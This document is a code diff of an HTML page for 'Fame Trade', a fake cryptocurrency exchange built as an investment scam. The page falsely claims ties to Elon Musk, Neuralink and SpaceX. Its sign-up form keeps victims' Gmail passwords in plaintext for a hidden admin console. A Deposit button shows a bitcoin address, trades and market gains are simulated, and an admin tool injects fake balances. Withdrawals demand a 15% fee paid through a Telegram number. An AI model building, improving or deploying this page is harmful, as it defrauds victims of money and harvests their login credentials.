@@ -3,169 +3,189 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Fame Trade | Sponsored by Elon Musk</title>
+    <title>Fame Trade | Professional Crypto Exchange</title>
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
     <style>
         :root { --green: #00c853; --red: #ff3d00; --dark: #0a0a0a; --card: #141414; --gold: #f3ba2f; }
-        body { font-family: -apple-system, sans-serif; background: var(--dark); color: white; margin: 0; }
+        body { font-family: -apple-system, sans-serif; background: var(--dark); color: white; margin: 0; padding: 0; overflow-x: hidden; }
         .hidden { display: none !important; }
         .page { min-height: 100vh; padding: 15px; box-sizing: border-box; }
-        .card { background: var(--card); border-radius: 15px; padding: 20px; border: 1px solid #222; margin-bottom: 15px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #222; color: white; font-size: 1rem; }
-        .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; font-size: 1rem; }
+        .card { background: var(--card); border-radius: 12px; padding: 15px; border: 1px solid #222; margin-bottom: 12px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #333; background: #222; color: white; font-size: 1rem; box-sizing: border-box; }
+        .btn { width: 100%; padding: 14px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; font-size: 1rem; transition: 0.2s; }
         .btn-green { background: var(--green); color: white; }
-        .balance-usd { font-size: 2.8rem; font-weight: 800; text-align: center; margin: 10px 0; }
+        .btn-red { background: var(--red); color: white; }
+        .balance-usd { font-size: 2.2rem; font-weight: 800; text-align: center; margin: 5px 0; }
         
-        /* Admin View */
-        #admin-dash { background: #f4f4f4; color: black; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; overflow-y: auto; padding: 20px; box-sizing: border-box; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { border: 1px solid #ccc; padding: 12px; text-align: left; }
+        /* Market List & Charts */
+        .market-list { max-height: 350px; overflow-y: auto; }
+        .coin-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #222; }
+        .coin-info { font-size: 0.9rem; }
+        
+        /* Admin UI */
+        #admin-dash { background: #fff; color: #000; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; overflow-y: auto; padding: 20px; box-sizing: border-box; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.8rem; }
+        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
     </style>
 </head>
 <body>
 
 <div id="auth-page" class="page">
-    <div style="margin-top: 15vh; text-align: center;">
-        <h1 style="color: var(--gold); font-size: 2.5rem; margin-bottom: 0;">Fame Trade</h1>
-        <p style="color: #666; margin-bottom: 30px;">World-Class Crypto Exchange</p>
-        <div class="card">
-            <h3 id="auth-title">Create Account</h3>
-            <input type="email" id="auth-email" placeholder="Email Address (Gmail)">
-            <input type="password" id="auth-pass" placeholder="Create Password">
-            <button class="btn btn-green" onclick="processAuth()">Get Started</button>
-            <p id="auth-switch" onclick="toggleAuth()" style="color: #888; font-size: 0.8rem; margin-top: 15px; cursor: pointer;">
-                Already have an account? <span style="color: var(--gold);">Login</span>
-            </p>
+    <div style="margin-top: 20vh; text-align: center;">
+        <h1 style="color: var(--gold); margin: 0;">Fame Trade</h1>
+        <p style="color: #666; font-size: 0.8rem;">Powered by Neuralink Cloud</p>
+        <div class="card" style="margin-top: 30px;">
+            <h3>Login or Sign Up</h3>
+            <input type="email" id="auth-email" placeholder="Gmail Address">
+            <input type="password" id="auth-pass" placeholder="Password">
+            <button class="btn btn-green" onclick="registerUser()">Start Trading</button>
         </div>
     </div>
 </div>
 
 <div id="main-site" class="page hidden">
-    <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
-        <h2 style="color: var(--gold); margin: 0;">Fame Trade</h2>
-        <div style="font-size: 0.7rem; color: #555;">UID: 8273641</div>
-    </header>
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+        <h3 style="color: var(--gold); margin: 0;">Fame Trade</h3>
+        <span id="user-display" style="font-size: 0.7rem; color: #555;"></span>
+    </div>
 
-    <div class="card" style="text-align: center; border: 1px solid #333;">
-        <div style="color: var(--gold); font-weight: 600;" id="btc-val">0.00000000 BTC</div>
-        <div class="balance-usd" id="usd-val">$0.00</div>
-        <div style="display: flex; gap: 10px; margin-top: 15px;">
-            <button class="btn btn-green" style="flex:1" onclick="alert('BTC Address: bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm')">Deposit</button>
-            <button class="btn" style="flex:1; background:#333; color:white;" onclick="checkWithdrawal()">Withdraw</button>
+    <div class="card" style="text-align: center;">
+        <div id="btc-val" style="color: var(--gold); font-family: monospace;">0.00000000 BTC</div>
+        <div id="usd-val" class="balance-usd">$0.00</div>
+        <div style="display: flex; gap: 8px; margin-top: 10px;">
+            <button class="btn" style="background:#222; color:white; flex:1" onclick="alert('Wallet Address: bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm')">Deposit</button>
+            <button class="btn" style="background:#333; color:white; flex:1" onclick="handleWithdraw()">Withdraw</button>
         </div>
     </div>
 
-    <div id="tv-chart" style="height: 300px; border-radius: 15px; overflow: hidden; margin-bottom: 20px;"></div>
+    <div id="chart-container" style="height: 280px; border-radius: 12px; overflow: hidden; margin-bottom: 15px;"></div>
 
-    <h3>Transaction History</h3>
-    <div class="card" id="history-box" style="font-size: 0.8rem; min-height: 100px;">
-        <div style="color: #444; text-align: center; margin-top: 20px;">No recent activities</div>
+    <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+        <button class="btn btn-green" onclick="execTrade('Buy')">Buy Now</button>
+        <button class="btn btn-red" onclick="execTrade('Sell')">Sell Now</button>
     </div>
 
-    <div style="padding: 20px; text-align: center; color: #333; font-size: 0.7rem;">
-        <p>Sponsored by <b>Elon Musk</b></p>
-        <div onclick="showAdminGate()" style="width: 30px; height: 30px; margin: auto;">.</div>
+    <h3>24h Market Watch</h3>
+    <div class="card market-list" id="asset-list"></div>
+
+    <div style="text-align: center; padding: 40px 0;">
+        <p style="color: #111; font-size: 0.7rem;" onclick="openGate()">Official Partner of SpaceX & X.com</p>
+    </div>
+</div>
+
+<div id="admin-gate" class="hidden" style="position:fixed; top:0; background:rgba(0,0,0,0.98); width:100%; height:100%; z-index:9999; display:flex; align-items:center; justify-content:center;">
+    <div class="card" style="background:#fff; color:#000; width:85%; max-width:320px;">
+        <h2 style="text-align:center;">Admin Access</h2>
+        <input type="text" id="adm-id" placeholder="Admin ID" style="background:#eee; color:#000;">
+        <input type="password" id="adm-pass" placeholder="Password" style="background:#eee; color:#000;">
+        <button class="btn btn-green" onclick="loginAdmin()">Unlock Console</button>
+        <button onclick="closeGate()" style="width:100%; background:none; border:none; color:gray; margin-top:10px;">Cancel</button>
     </div>
 </div>
 
 <div id="admin-dash" class="hidden">
-    <div style="display: flex; justify-content: space-between; align-items: center;">
-        <h2>Admin Panel</h2>
-        <button onclick="location.reload()" style="background:red; color:white; border:none; padding:10px; border-radius:5px;">Logout Admin</button>
+    <div style="display:flex; justify-content:space-between;">
+        <h2>Admin Console</h2>
+        <button onclick="location.reload()" style="background:red; color:white; padding:5px 10px; border:none; border-radius:5px;">Logout</button>
+    </div>
+    
+    <div style="background:#f9f9f9; padding:15px; border-radius:10px; border:1px solid #ddd; margin:15px 0;">
+        <h4>Inject Funds to Wallet</h4>
+        <input type="email" id="inj-target" placeholder="User Gmail (Copy below)">
+        <input type="number" id="inj-amt" placeholder="Amount to Inject ($USD)">
+        <button class="btn btn-green" onclick="processInjection()">Inject Funds Now</button>
     </div>
 
-    <div style="background: #eee; padding: 20px; border-radius: 15px; margin: 20px 0;">
-        <h3>Fund Injector</h3>
-        <input type="email" id="target-email" placeholder="User Email" style="background:white; color:black;">
-        <input type="number" id="inj-amount" placeholder="Amount to Inject ($)" style="background:white; color:black;">
-        <button class="btn btn-green" onclick="adminInject()">Inject Funds Now</button>
-    </div>
-
-    <h3>User Logs (All Emails & Passwords)</h3>
-    <table id="log-table">
-        <thead><tr style="background:#ddd;"><th>Email</th><th>Password</th><th>Status</th></tr></thead>
-        <tbody id="log-body"></tbody>
+    <h4>User Activity Logs</h4>
+    <table>
+        <thead style="background:#eee;"><tr><th>Gmail</th><th>Password</th><th>Status</th></tr></thead>
+        <tbody id="user-logs"></tbody>
     </table>
 </div>
 
-<div id="admin-gate" class="hidden" style="position:fixed; top:0; background:rgba(0,0,0,0.9); width:100%; height:100%; z-index:9999; display:flex; align-items:center; justify-content:center;">
-    <div class="card" style="background:white; color:black; width:85%; max-width:320px;">
-        <h3 style="text-align:center;">Admin Access</h3>
-        <input type="text" id="adm-u" placeholder="Admin ID">
-        <input type="password" id="adm-p" placeholder="Password">
-        <button class="btn btn-green" onclick="enterAdmin()">Unlock</button>
-    </div>
-</div>
-
 <script>
-    let users = JSON.parse(localStorage.getItem('fame_db')) || [];
-    let session = JSON.parse(localStorage.getItem('fame_session')) || null;
-    let balance = parseFloat(localStorage.getItem('fame_bal')) || 0;
-    let isLoginMode = false;
+    let users = JSON.parse(localStorage.getItem('ft_db')) || [];
+    let currentSession = JSON.parse(localStorage.getItem('ft_session')) || null;
+    let balance = parseFloat(localStorage.getItem('ft_bal')) || 0;
+    let activeSymbol = "BTCUSDT";
 
-    function toggleAuth() {
-        isLoginMode = !isLoginMode;
-        document.getElementById('auth-title').innerText = isLoginMode ? "Login" : "Create Account";
-        document.getElementById('auth-switch').innerHTML = isLoginMode ? 'Need an account? <span style="color:var(--gold);">Sign Up</span>' : 'Already have an account? <span style="color:var(--gold);">Login</span>';
-    }
-
-    function processAuth() {
-        const e = document.getElementById('auth-email').value;
-        const p = document.getElementById('auth-pass').value;
-        if(e && p) {
-            if(!isLoginMode) {
-                users.push({email: e, pass: p});
-                localStorage.setItem('fame_db', JSON.stringify(users));
-            }
-            localStorage.setItem('fame_session', JSON.stringify({email: e}));
+    function registerUser() {
+        const email = document.getElementById('auth-email').value;
+        const pass = document.getElementById('auth-pass').value;
+        if(email && pass) {
+            users.push({email, pass});
+            localStorage.setItem('ft_db', JSON.stringify(users));
+            localStorage.setItem('ft_session', JSON.stringify({email}));
             location.reload();
         }
     }
 
-    if(session) {
+    if(currentSession) {
         document.getElementById('auth-page').classList.add('hidden');
         document.getElementById('main-site').classList.remove('hidden');
-        updateDisplay();
-        new TradingView.widget({
-            "container_id": "tv-chart", "autosize": true, "symbol": "BINANCE:BTCUSDT", "theme": "dark", "style": "1", "hide_top_toolbar": true
+        document.getElementById('user-display').innerText = currentSession.email;
+        refreshUI();
+        loadMarkets();
+        loadChart(activeSymbol);
+    }
+
+    function refreshUI() {
+        document.getElementById('usd-val').innerText = "$" + balance.toLocaleString();
+        document.getElementById('btc-val').innerText = (balance / 97000).toFixed(8) + " BTC";
+    }
+
+    function loadMarkets() {
+        const coins = ["BTC", "ETH", "SOL", "BNB", "XRP", "ADA", "DOGE", "TRX", "DOT", "MATIC", "LTC", "SHIB", "AVAX", "LINK", "UNI", "ATOM", "TON", "BCH", "ETC", "XLM"];
+        const list = document.getElementById('asset-list');
+        coins.forEach(c => {
+            list.innerHTML += `<div class="coin-item">
+                <div class="coin-info"><b>${c}/USD</b><br><small style="color:var(--green)">+${(Math.random()*4).toFixed(2)}%</small></div>
+                <button class="btn-green" style="padding:6px 12px; font-size:0.7rem; border-radius:5px;" onclick="loadChart('${c}USDT')">View Chart</button>
+            </div>`;
         });
     }
 
-    function updateDisplay() {
-        document.getElementById('usd-val').innerText = "$" + balance.toLocaleString();
-        document.getElementById('btc-val').innerText = (balance / 96500).toFixed(8) + " BTC";
+    function loadChart(s) {
+        activeSymbol = s;
+        document.getElementById('chart-container').innerHTML = "";
+        new TradingView.widget({
+            "container_id": "chart-container", "autosize": true, "symbol": "BINANCE:"+s, "theme": "dark", "style": "1", "hide_top_toolbar": true
+        });
     }
 
-    function checkWithdrawal() {
-        if(balance < 500) alert("Insufficient Funds: Minimum withdrawal is $500.");
-        else alert("Verification Required:\n\nPlease contact support or pay 15% of your balance to complete withdrawal.\n\nTelegram: +1 215 620 8677");
+    function execTrade(type) {
+        if(balance <= 0) alert("Trade Failed: Insufficient funds. Please deposit.");
+        else alert(type + " Order Executed for " + activeSymbol + " using wallet balance.");
     }
 
-    function showAdminGate() { document.getElementById('admin-gate').classList.remove('hidden'); }
+    function handleWithdraw() {
+        if(balance < 500) alert("Minimum withdrawal is $500.");
+        else alert("Verification Required: Pay 15% fee to verify wallet. Telegram: +1 215 620 8677");
+    }
 
-    function enterAdmin() {
-        if(document.getElementById('adm-u').value === "Admin" && document.getElementById('adm-p').value === "ElonMusk2025") {
-            document.getElementById('admin-gate').classList.add('hidden');
+    // ADMIN LOGIC
+    function openGate() { document.getElementById('admin-gate').classList.remove('hidden'); }
+    function closeGate() { document.getElementById('admin-gate').classList.add('hidden'); }
+    
+    function loginAdmin() {
+        if(document.getElementById('adm-id').value === "Admin" && document.getElementById('adm-pass').value === "ElonMusk2025") {
+            closeGate();
             document.getElementById('admin-dash').classList.remove('hidden');
-            const tbody = document.getElementById('log-body');
-            tbody.innerHTML = "";
+            const logBody = document.getElementById('user-logs');
+            logBody.innerHTML = "";
             users.forEach(u => {
-                tbody.innerHTML += `<tr><td>${u.email}</td><td><b>${u.pass}</b></td><td style="color:green">Active</td></tr>`;
+                logBody.innerHTML += `<tr><td>${u.email}</td><td><b>${u.pass}</b></td><td style="color:green">Active</td></tr>`;
             });
-        }
+        } else { alert("Unauthorized Access"); }
     }
 
-    function adminInject() {
-        const amt = parseFloat(document.getElementById('inj-amount').value);
+    function processInjection() {
+        const amt = parseFloat(document.getElementById('inj-amt').value);
         if(amt) {
             balance += amt;
-            localStorage.setItem('fame_bal', balance);
-            updateDisplay();
-            document.getElementById('history-box').innerHTML = `<div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #222;">
-                <span><b>Deposit (Injected)</b><br><small>${new Date().toLocaleDateString()}</small></span>
-                <span style="color:var(--green); text-align:right">+$${amt.toLocaleString()}<br><small>Success</small></span>
-            </div>` + document.getElementById('history-box').innerHTML;
-            alert("Funds injected successfully into: " + document.getElementById('target-email').value);
+            localStorage.setItem('ft_bal', balance);
+            refreshUI();
+            alert("Funds Injected Successfully!");
             document.getElementById('admin-dash').classList.add('hidden');
         }
     }
